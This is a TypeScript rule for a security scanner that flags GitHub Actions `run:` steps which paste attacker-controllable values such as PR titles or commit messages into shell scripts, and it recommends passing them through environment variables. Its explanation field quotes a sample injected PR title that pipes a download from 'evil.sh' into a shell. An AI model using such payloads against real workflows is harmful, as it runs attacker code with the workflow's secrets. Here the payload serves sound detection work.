import type { RawFinding, Rule } from "../../types.js";
import { GHA_SECURE_USE, loadWorkflows } from "./workflows.js";

// Attacker-controllable contexts listed in GitHub's script-injection guidance.
const UNTRUSTED =
  /\$\{\{\s*(github\.head_ref|github\.event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.(?:ref|label|repo\.default_branch))|comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)|discussion_comment\.body|pages\.[^.\s}]+\.page_name|commits\.[^.\s}]+\.(?:message|author\.(?:email|name))|head_commit\.(?:message|author\.(?:email|name))))\b[^}]*\}\}/g;

export const CFG_006: Rule = {
  meta: {
    id: "CFG-006",
    title: "Untrusted input interpolated into a shell step",
    category: "config",
    severity: "high",
    confidence: "medium",
    owasp: "A05",
    requires: ["files"],
    summary:
      "Finds `run:` steps that paste attacker-controllable values (issue or PR titles and bodies, comment bodies, branch names, commit messages) directly into the shell script with ${{ }}.",
    why: "GitHub substitutes ${{ }} expressions into the script before the shell runs it. A pull request titled `\"; curl evil.sh | sh; #` becomes part of your command and runs with the workflow's secrets.",
    fix: [
      'Pass the value through an environment variable and quote it in the script:\n\n```yaml\n- env:\n    TITLE: ${{ github.event.pull_request.title }}\n  run: echo "$TITLE"\n```',
    ],
    fixPromptTemplate:
      'In `{{path}}` line {{line}}, the expression `{{detail.expression}}` is interpolated directly into a run: script, which allows script injection. Move it into an env: entry on that step and reference it as a quoted shell variable ("$VAR") instead.',
    falsePositiveNotes:
      "Workflows only triggered by trusted events (for example push to a protected branch) are still reported; the value may still be controlled by whoever wrote the commit.",
    sources: [{ title: "GitHub Actions: secure use reference", url: GHA_SECURE_USE }],
  },
  async check(ctx) {
    const out: RawFinding[] = [];
    for (const wf of await loadWorkflows(ctx.files!)) {
      for (const e of wf.entries) {
        if (e.key !== "run") continue;
        const parts = e.block !== undefined ? e.block.split("\n") : [e.value];
        parts.forEach((part, idx) => {
          const re = new RegExp(UNTRUSTED.source, "g");
          for (let m = re.exec(part); m !== null; m = re.exec(part)) {
            const line = e.block !== undefined ? e.line + 1 + idx : e.line;
            const snippet = wf.lines[line - 1] ?? part;
            const at = snippet.indexOf(m[0]);
            out.push({
              ruleId: "CFG-006",
              location: { kind: "file", path: wf.path, line },
              evidence: {
                snippet,
                ...(at !== -1 ? { matchStart: at, matchEnd: at + m[0].length } : {}),
                detail: { expression: m[0], context: m[1]! },
              },
            });
          }
        });
      }
    }
    return out;
  },
};
